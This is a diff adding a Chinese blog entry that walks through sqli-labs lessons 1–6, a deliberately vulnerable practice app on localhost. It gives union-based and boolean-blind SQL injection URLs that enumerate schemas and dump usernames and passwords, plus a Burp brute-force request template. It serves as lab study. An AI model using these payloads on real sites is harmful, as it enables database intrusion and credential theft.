@@ -58,4 +58,66 @@
 <p>找到header中x-flag</p>
 <h5 id="Login-as-Admin-0"><a href="#Login-as-Admin-0" class="headerlink" title="Login as Admin 0"></a>Login as Admin 0</h5>]]></content>
   </entry>
+  <entry>
+    <title>sqli-labs</title>
+    <url>/2020/05/06/sqli-labs/</url>
+    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>•1. left()函数： left(database(),1)=‘s’           left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</p>
+<p>•2. regexp函数：select user() regexp ‘r’         user()的结果是root，regexp为匹配root的正则表达式</p>
+<p>•3. like函数： select user() like ‘ro%’            匹配与regexp相似。</p>
+<p>•4. substr(a,b,c)  select substr() XXXX            substr(a,b,c)从位置b开始，截取a字符串c位长度</p>
+<p>•5. ascii()    将某个字符串转化为ascii值 </p>
+<p>•6. chr(数字)  或者是ord(‘字母’)  使用python中的两个函数可以判断当前的ascii值是多少</p>
+<p>•对于security数据库：</p>
+<p>• select left(database(),1)=‘s’;  前1位是否是s</p>
+<p>• select database() regexp ‘s’; 匹配第一个字符是否是 s</p>
+<p>• select database() like ‘s%’;   匹配第一个字符是否是 s</p>
+<p>• select substr((select database()),1,1)=’s’; 匹配第一个字符是否是 s</p>
+<p>• select substr((select database()),1,3)= ‘sec’; 匹配前三个个字符是否是 sec</p>
+<p>• select ascii(substr((select database()),1,1));  直接回显115 或者是：</p>
+<p>• select ascii(substr((select database()),1,1)) &gt; 110; 如果大于110，就会返回1，否则返回0.</p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>•1. <a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/</a><a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">sqli</a><a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">/Less-1/?id=1</a>’   查看是否有注入</p>
+<p>•2.  <a href="http://127.0.0.1/sqli/Less-1/?id=1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1‘</a> order by 3–+  查看有多少列</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,3–+ 查看哪些数据可以回显</p>
+<p>•4. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,database()–+ 查看当前数据库</p>
+<p>•5. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,schema_name from information_schema.schemata limit 4,1–+ 查看数据库security，或者是：  <a href="http://127.0.0.1/sqli/Less-1/?id=-1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1’</a> union select 1,2,group_concat(schema_name) from information_schema.schemata–+ 查看所有的数据库</p>
+<p>•6. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1–+ 查表，或者是：<a href="http://127.0.0.1/sqli/Less-1/?id=-1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1’</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479–+ 查看所有的</p>
+<p>•7. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,column_name from information_schema.columns where table_name=0x7573657273–+ 查询列信息，或者是：<a href="http://127.0.0.1/sqli/Less-1/?id=-1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1’</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273–+ 查看所以的列信息</p>
+<p>•8. <a href="http://127.0.0.1/sqli/Less-1/?id=-1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1‘</a> union select 1,2,concat_ws(’<del>‘,username,password) from security.users limit 1,1–+ 查询一个账号和密码，或者是：<a href="http://127.0.0.1/sqli/Less-1/?id=-1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1’</a> union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users –+ 直接可以得到所有的账号和密码，并且使用</del>符号进行分割。</p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p> •1. <a href="http://127.0.0.1/sqli/Less-2/?id=1" target="_blank" rel="noopener">http://127.0.0.1/</a><a href="http://127.0.0.1/sqli/Less-2/?id=1" target="_blank" rel="noopener">sqli</a><a href="http://127.0.0.1/sqli/Less-2/?id=1" target="_blank" rel="noopener">/Less-2/?id=1</a>’   查看是否有注入</p>
+<p>•2.  <a href="http://127.0.0.1/sqli/Less-2/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-2/?id=1</a> order by 3–+  查看有多少列</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1</a> union select 1,2,3–+ 查看哪些数据可以回显</p>
+<p>•4. <a href="http://127.0.0.1/sqli/Less-2/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-2/?id=-1</a> union select 1,2,group_concat(schema_name) from information_schema.schemata –+ 查看所有数据库</p>
+<p>•5. <a href="http://127.0.0.1/sqli/Less-2/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-2/?id=-1</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 –+查看所有的表</p>
+<p>•6. <a href="http://127.0.0.1/sqli/Less-2/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-2/?id=-1</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 –+查看所有的列信息</p>
+<p>•7. <a href="http://127.0.0.1/sqli/Less-2/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-2/?id=-1</a> union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users –+直接可以得到所有的账号和密码，并且使用~符号进行分割。</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>•1. <a href="http://127.0.0.1/sqli/Less-3/?id=1" target="_blank" rel="noopener">http://127.0.0.1/</a><a href="http://127.0.0.1/sqli/Less-3/?id=1" target="_blank" rel="noopener">sqli</a><a href="http://127.0.0.1/sqli/Less-3/?id=1" target="_blank" rel="noopener">/Less-3/?id=1</a>’ 查看是否有注入</p>
+<p>•2. <a href="http://127.0.0.1/sqli/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-3/?id=1&#39;</a>) order by 3–+ 查看有多少列</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-3/?id=-1&#39;</a>) union select 1,2, group_concat(schema_name) from information_schema.schemata –+ 查看所有数据库</p>
+<p>•6. <a href="http://127.0.0.1/sqli/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-3/?id=-1&#39;</a>) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 –+查看所有的表</p>
+<p>•7. <a href="http://127.0.0.1/sqli/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-3/?id=-1&#39;</a>) union select 1,2, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 –+查看所有的列信息</p>
+<p>•8. <a href="http://127.0.0.1/sqli/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-3/?id=-1&#39;</a>) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users –+直接可以得到所有的账号和密码，并且使用~符号进行分割。</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>•1. <a href="http://127.0.0.1/sqli/Less-4/?id=1&quot;查看是否有注入" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=1&quot;查看是否有注入</a></p>
+<p>•2. <a href="http://127.0.0.1/sqli/Less-4/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=1”</a>) order by 3–+查看有多少列</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-4/?id=-1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=-1&quot;</a>) union select 1,2, group_concat(schema_name) from information_schema.schemata –+查看所有数据库</p>
+<p>•4. <a href="http://127.0.0.1/sqli/Less-4/?id=-1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=-1&quot;</a>) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 –+查看所有的表</p>
+<p>•5. <a href="http://127.0.0.1/sqli/Less-4/?id=-1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=-1&quot;</a>) union select 1,2, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 –+查看所有的列信息</p>
+<p>•6. <a href="http://127.0.0.1/sqli/Less-4/?id=-1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-4/?id=-1&quot;</a>) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users –+直接可以得到所有的账号和密码，并且使用~符号进行分割。</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>•1. <a href="http://127.0.0.1/sqli/Less-5/?id=1" target="_blank" rel="noopener">http://127.0.0.1/</a><a href="http://127.0.0.1/sqli/Less-5/?id=1" target="_blank" rel="noopener">sqli</a><a href="http://127.0.0.1/sqli/Less-5/?id=1" target="_blank" rel="noopener">/Less-5/?id=1</a>’ 查看是否有注入  </p>
+<p>•2. <a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a> order by 3–+ 查看有多少列</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-5/?id=1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1‘</a> and left((select database()),1)=’s’–+ 判断第一位是否是s，然后使用bp进行爆破处理：</p>
+<p>•  GET /sqli/Less-5/？id=1%27%20and%20left((select%20database()),2)=%27s§a§%27–+ HTTP/1.1</p>
+<p>•通过返回的长度来确定第二位是多少，最后确定为e，依次类推进行测试。</p>
+<p>•4. 或者是使用if来进行判断测试： <a href="http://127.0.0.1/sqli/Less-5/?id=1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1‘</a> and ascii(substr((select database()),1,1))&gt;156–+（此时是没有返回的） （这种方法是错误的）</p>
+<p>•<a href="http://127.0.0.1/sqli/Less-5/?id=1‘" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1‘</a> and ascii(substr((select database()),1,1))&gt;110–+ 此时返回 you are in…….代表执行成功。</p>
+<h5 id="完整注入流程"><a href="#完整注入流程" class="headerlink" title="完整注入流程"></a>完整注入流程</h5><p>•完整注入流程：</p>
+<p>•1. <a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100–+ 通过二分法猜解得到所有的库,红色为可变参数。</p>
+<p>•2. <a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1–+ 再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+ 通过二分法可猜解users内的字段，其中红色为可变参数。</p>
+<p>•4. <a href="http://127.0.0.1/sqli/Less-5/?id=1’" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1’</a> and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1–+继续猜解即可得到字段内的值。</p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>•1. <a href="http://127.0.0.1/sqli/Less-5/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1”</a> and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100–+ 通过二分法猜解得到所有的库,红色为可变参数。</p>
+<p>•2. <a href="http://127.0.0.1/sqli/Less-5/?id=1”and" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1”and</a> ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1–+ 再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</p>
+<p>•3. <a href="http://127.0.0.1/sqli/Less-5/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1”</a> and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+ 通过二分法可猜解users内的字段，其中红色为可变参数。</p>
+<p>•4. <a href="http://127.0.0.1/sqli/Less-5/?id=1”and" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1”and</a> ascii(substr((select username from security.users limit 1,1),1,1))&gt;1–+继续猜解即可得到字段内的值。</p>
+]]></content>
+  </entry>
 </search>
